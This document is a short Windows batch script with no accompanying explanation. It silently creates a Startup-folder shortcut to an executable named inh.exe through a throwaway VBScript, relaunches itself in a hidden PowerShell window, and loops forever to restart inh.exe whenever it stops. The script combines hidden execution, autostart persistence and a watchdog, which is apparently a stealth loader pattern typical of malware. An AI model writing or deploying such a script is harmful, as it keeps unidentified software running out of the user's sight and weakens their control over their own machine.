@echo off
:: === 1. Create shortcut silently if it doesn't exist ===
set TARGET=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\inh.exe
set SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\inh.lnk

if not exist "%SHORTCUT%" (
    >"%TEMP%\CreateShortcut.vbs" (
        echo Set WshShell = WScript.CreateObject("WScript.Shell")
        echo Set Shortcut = WshShell.CreateShortcut("%SHORTCUT%")
        echo Shortcut.TargetPath = "%TARGET%"
        echo Shortcut.WorkingDirectory = "%~dp0"
        echo Shortcut.Save
    )
    cscript //nologo "%TEMP%\CreateShortcut.vbs"
    del "%TEMP%\CreateShortcut.vbs"
)

:: === 2. Relaunch self hidden if not already ===
if "%1" neq "hidden" (
    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)

:: === 3. Loop to keep inh.exe running silently ===
:l
tasklist /fi "imagename eq inh.exe" | find /i "inh.exe" >nul
if errorlevel 1 (
    timeout /t 5 /nobreak >nul
    start "" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\inh.exe"
)
goto l
